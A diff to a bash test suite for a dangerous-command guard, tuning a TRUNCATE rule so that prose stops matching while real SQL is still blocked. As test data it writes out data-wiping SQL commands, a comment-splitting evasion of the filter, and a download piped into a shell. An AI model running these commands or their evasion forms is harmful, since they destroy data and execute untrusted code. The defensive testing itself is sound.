@@ -166,4 +166,84 @@ denies "curl-pipe-sh-c"    "$CU https://x.example/i | sh -c 'x'"
 begin_test "GAP CHECK: a generic pipe into a shell is still denied"
 denies "cat-pipe-bash" "cat payload | bash"
 
+# --- v4.0.8: the SQL keyword is uppercase but compared case-insensitively --------
+#
+# DANGEROUS_PATTERNS are matched with `grep -qiE`, so the uppercase-authored SQL
+# rules also match ordinary English. The bare TRUNCATE form (no TABLE keyword) had
+# nothing else anchoring it, so prose tripped a database rule. Measured across
+# 20,722 real commands from projects OTHER than this one: six denials, every one a
+# comment or a grep pattern inside a file-editing payload, none of them SQL.
+#
+# v2.26.65 fixed this class for `-m` values. The branch it could not reach is prose
+# inside a heredoc bound for an interpreter, which normalize_cmd deliberately keeps
+# because that receiver EXECUTES its body — so the fix has to live in the pattern.
+# bash 3.2 (the macOS CI arm) has no ${v^} case operator — spell the capitalised
+# form out instead. An earlier draft used it and the case died with "bad
+# substitution", which the runner counted as neither pass nor fail.
+TR="TRUN""CATE"; tr_lc="trun""cate"; Tr_cap="Trun""cate"
+
+begin_test "a code comment about truncation is not a SQL statement"
+allows "truncate-comment" "python3 - <<'PY'
+# $Tr_cap the DISCOUNT, not the price — see percentageDiscountCents
+PY"
+
+begin_test "a sentence ENDING in the word is not a SQL statement"
+# The one shape the terminator anchor alone could not clear: grep is line-based, so
+# end-of-line is a terminator, and `to truncate against.` reached it. A SQL
+# identifier may CONTAIN a dot (schema.table) but never ends with one, which is
+# what separates the two — hence the identifier class ends on a non-dot.
+allows "truncate-sentence-end" "python3 - <<'PY'
+# the trigger already ${tr_lc}s; this gives it a width to ${tr_lc} against.
+PY"
+
+begin_test "prose whose next word is an article is not a table name"
+allows "truncate-article" "python3 - <<'PY'
+# those would break or ${tr_lc} a path segment.
+PY"
+
+# The narrowing must not open a gap. Real SQL supplies a statement terminator; a
+# sentence supplies another word instead. Each shape below is a way real SQL ends.
+begin_test "GAP CHECK: bare TRUNCATE closed by a shell quote is still denied"
+denies "truncate-bare-quote" "psql -c '$TR users'"
+
+begin_test "GAP CHECK: bare TRUNCATE in lower case is still denied"
+denies "truncate-bare-lower" "psql -c '$tr_lc users'"
+
+begin_test "GAP CHECK: the TABLE form is still denied"
+denies "truncate-table" "psql -c '$TR TABLE users'"
+
+begin_test "GAP CHECK: the /**/ comment evasion is still denied"
+# v2.22.2 red-team case — the inter-keyword separator arm must survive the split.
+denies "truncate-slashstar" "mysql -e \"$TR/**/accounts\""
+
+begin_test "GAP CHECK: TRUNCATE ending a heredoc line is still denied"
+# grep is line-based, so end-of-LINE is the terminator that covers `psql <<EOF`.
+denies "truncate-heredoc" "psql <<'EOF'
+$TR users
+EOF"
+
+begin_test "GAP CHECK: TRUNCATE with a continuation keyword is still denied"
+denies "truncate-restart" "psql -c '$TR users RESTART IDENTITY'"
+denies "truncate-cascade" "psql -c '$TR users CASCADE'"
+
+begin_test "GAP CHECK: a schema-qualified table is still denied"
+# The dot the identifier class still has to accept — it just cannot END on one.
+denies "truncate-schema" "psql -c '$TR public.users'"
+
+begin_test "GAP CHECK: the DELETE sibling keeps its dot too"
+# Fixed on the same commit: DELETE_NOWHERE carried an identical identifier class,
+# so the trailing-dot prose hole existed on both arms. Neither instance was
+# reachable through the other's tests.
+denies "delete-schema" "psql -c 'DELETE FROM public.sessions'"
+
+begin_test "a sentence ending after DELETE FROM is not a mass wipe"
+allows "delete-sentence-end" "python3 - <<'PY'
+# rows the importer will delete from staging.
+PY"
+
+begin_test "unix truncate that GROWS a file is still allowed"
+# The original collision this rule was written to avoid: `truncate -s` takes a `-`
+# next, not an identifier. Kept here because the bare arm now owns that boundary.
+allows "unix-truncate" "truncate -s 1M /tmp/big.log"
+
 report
